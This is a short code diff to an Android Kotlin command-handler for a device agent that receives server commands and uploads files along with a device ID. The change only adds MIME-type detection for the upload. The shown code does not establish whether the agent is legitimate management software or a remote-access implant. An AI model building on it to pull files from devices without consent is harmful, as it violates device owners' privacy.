@@ -14,6 +14,7 @@ import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
+import android.webkit.MimeTypeMap
 
 /**
  * Handles commands received from the server.
@@ -217,7 +218,15 @@ object CommandHandler {
         val deviceId = prefs.getString(AgentConfig.KEY_DEVICE_ID, "") ?: ""
 
         val deviceIdBody = deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
-        val fileBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
+        
+        // Dynamic MIME type detection
+        val extension = MimeTypeMap.getFileExtensionFromUrl(file.path)
+        val mimeType = if (extension != null) {
+            MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.lowercase())
+        } else null
+        
+        val contentType = mimeType ?: "application/octet-stream"
+        val fileBody = file.asRequestBody(contentType.toMediaTypeOrNull())
         val filePart = MultipartBody.Part.createFormData("file", file.name, fileBody)
 
         val api = NetworkClient.getApiService(context)
